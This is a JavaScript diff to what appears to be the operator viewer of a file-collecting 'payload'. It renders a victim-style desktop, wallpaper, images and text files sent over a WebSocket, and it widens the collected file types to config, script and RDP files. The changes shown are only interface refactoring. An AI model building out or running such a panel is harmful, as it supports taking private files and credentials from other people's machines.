@@ -4,6 +4,10 @@ let currentPath = [];
 let imageData = {};
 let textData = {};
 
+// All text-based extensions the payload collects
+const textExtensions = ['txt', 'log', 'csv', 'xml', 'json', 'ini', 'bat', 'ps1', 'rdp'];
+const imageExtensions = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'];
+
 // For sidebar 
 function findFolderPath(tree, targetName, currentPath = []) {
   for (const key of Object.keys(tree)) {
@@ -87,7 +91,10 @@ function renderDesktop() {
   if (!desktopNode) return;
 
   const desktop = document.getElementById('desktop');
+  // Preserve the wallpaper when clearing icons
+  const bg = desktop.style.backgroundImage;
   desktop.innerHTML = '';
+  desktop.style.backgroundImage = bg;
 
   Object.keys(desktopNode).forEach(childName => {
     const div = document.createElement('div');
@@ -105,16 +112,16 @@ function renderDesktop() {
         renderFileExplorer();
       });
     } else {
-      if (['jpg','jpeg','png','webp','gif','bmp'].includes(ext) && imageData[fullPath]) {
+      if (imageExtensions.includes(ext) && imageData[fullPath]) {
         const mimeTypes = {'png':'image/png','jpg':'image/jpeg','jpeg':'image/jpeg','gif':'image/gif','webp':'image/webp','bmp':'image/bmp'};
         img.src = `data:${mimeTypes[ext]||'image/png'};base64,${imageData[fullPath]}`;
       } else {
         img.src = getIconPath(childName, false);
       }
       div.addEventListener('dblclick', () => {
-        if (['jpg','jpeg','png','webp','gif','bmp'].includes(ext)) {
+        if (imageExtensions.includes(ext)) {
           ImageViewer(fullPath);
-        } else if (['txt','log','csv'].includes(ext)) {
+        } else if (textExtensions.includes(ext)) {
           TextViewer(fullPath);
         }
       });
@@ -169,7 +176,7 @@ function renderFileExplorer() {
       const ext = childName.split('.').pop().toLowerCase();
       const fullPath = currentPath.length > 0 ? currentPath.join('\\') + '\\' + childName : childName;
 
-      if (['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'].includes(ext)) {
+      if (imageExtensions.includes(ext)) {
         if (imageData[fullPath]) {
           const imageTypes = {
             'png': 'image/png',
@@ -194,9 +201,9 @@ function renderFileExplorer() {
       childDiv.appendChild(label);
 
       childDiv.addEventListener('dblclick', () => {
-        if (['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'].includes(ext)) {
+        if (imageExtensions.includes(ext)) {
           ImageViewer(fullPath);
-        } else if (['txt', 'log', 'csv'].includes(ext)) {
+        } else if (textExtensions.includes(ext)) {
           TextViewer(fullPath);
         }
       });
@@ -252,7 +259,6 @@ document.querySelectorAll('.sidebar-item').forEach(item => {
   });
 });
 
-
 document.getElementById('sidebar-root').addEventListener('click', () => {
   currentPath = [];
   renderFileExplorer();
@@ -270,11 +276,12 @@ ws.onmessage = (event) => {
 
   } else if (msg.type === 'image') {
     imageData[msg.data.path] = msg.data.base64;
+    renderDesktop(); // Re-render so thumbnails update with the image data
 
   } else if (msg.type === 'wallpaper') {
     const data = msg.data.base64;
     document.getElementById('desktop').style.backgroundImage = `url(data:image/jpeg;base64,${data})`;
-  }else if (msg.type === 'reset'){
+  } else if (msg.type === 'reset') {
     fileTree = {};
     textData = {};
     imageData = {};
